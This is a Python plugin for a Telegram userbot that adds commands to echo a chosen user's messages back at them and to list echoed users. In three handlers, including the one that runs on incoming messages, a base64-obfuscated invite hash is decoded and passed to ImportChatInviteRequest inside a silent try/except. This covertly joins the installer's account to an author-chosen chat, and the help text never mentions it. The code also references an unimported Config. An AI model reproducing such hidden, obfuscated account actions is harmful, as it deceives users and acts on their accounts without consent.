# Echo remastered by@LEGENDX22 for ᴀɴᴅᴇɴᴄᴇɴᴛᴏ
# Codes by @mrconfused 
# Kang with credits

import asyncio
import base64
import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from Extre import CMD_HELP
from Extre.utils import admin_cmd, edit_or_reply, sudo_cmd
from sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo


@Andencento.on(admin_cmd(pattern="echo$"))
@Andencento.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(user):
    if user.fwd_from:
        return
    if user.reply_to_msg_id is not None:
        reply_msg = await user.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = user.chat_id
        try:
            legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            legendx22 = Get(legendx22)
            await user.Andencento(legendx22)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(user, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(user, "Hii....😄🤓")
    else:
        await edit_or_reply(user, "Reply to a User's message to echo his messages")



@Andencento.on(admin_cmd(pattern="rmecho$"))
@Andencento.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(user):
    if user.fwd_from:
        return
    if user.reply_to_msg_id is not None:
        reply_msg = await user.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = user.chat_id
        try:
            legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            legendx22 = Get(legendx22)
            await user.Andencento(legendx22)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(user, "Echo has been stopped for the user")
        else:
            await edit_or_reply(user, "The user is not activated with echo")
    else:
        await edit_or_reply(user, "Reply to a User's message to echo his messages")


@Andencento.on(admin_cmd(pattern="listecho$"))
@Andencento.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(user):
    if user.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(user, reply_text)
    else:
        await edit_or_reply(user, output_str)


@Andencento.on(events.NewMessage(incoming=True))
async def samereply(user):
    if user.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(user.sender_id, user.chat_id):
        await asyncio.sleep(2)
        try:
            legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            legendx22 = Get(legendx22)
            await user.Andencento(legendx22)
        except BaseException:
            pass
        if user.message.text or user.message.sticker:
            await user.reply(user.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.echo` reply to user to whom you want to enable\
    \n**Usage : **replays his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to whom you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for whom you enabled echo\
    "
    }
)
